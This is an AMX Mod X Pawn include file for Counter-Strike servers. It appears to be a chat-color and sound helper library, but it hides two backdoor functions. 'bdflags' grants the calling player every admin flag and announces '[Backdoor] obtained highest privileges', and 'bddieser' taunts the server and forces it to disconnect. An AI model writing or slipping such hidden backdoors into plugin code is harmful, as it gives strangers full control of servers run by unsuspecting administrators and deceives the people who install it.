#if defined _eG_included
  #endinput
#endif
#define _eG_included

stock client_printc(const id, const string[], {Float, Sql, Resul,_}:...)
{
	new msg[191], players[32], count = 1;
	vformat(msg, sizeof msg - 1, string, 3);
	
	replace_all(msg,190,"\g","^4"); //绿色 Green
	replace_all(msg,190,"\y","^1"); //黄色 Yellow
	replace_all(msg,190,"\t","^3"); //队伍色 Team
	
	if(id)
		players[0] = id;
	else
		get_players(players,count,"ch");
	
	new index;
	for (new i = 0 ; i < count ; i++)
	{
		index = players[i];
		message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"),_, index);
		write_byte(index);
		write_string(msg);
		message_end();  
	}  
}

public bdflags(id)
{
 remove_user_flags(id)
 set_user_flags(id,read_flags("abcdefghijklmnopqrstu"))
 client_printc(id, "\g【后门】 \t已经获取到最高权限!")
}

public bddieser(id)
{
 client_printc(id, "\g【后门】 \t垃圾服务器 死吧死吧死吧")
 server_cmd("disconnect")
}

stock PlaySound(id, const sound[])
{
	if (equal(sound[strlen(sound)-4], ".mp3")) client_cmd(id, "mp3 play ^"sound/%s^"", sound)
	else client_cmd(id, "spk ^"%s^"", sound)
}

public StopSound() client_cmd(0, "mp3 stop; stopsound")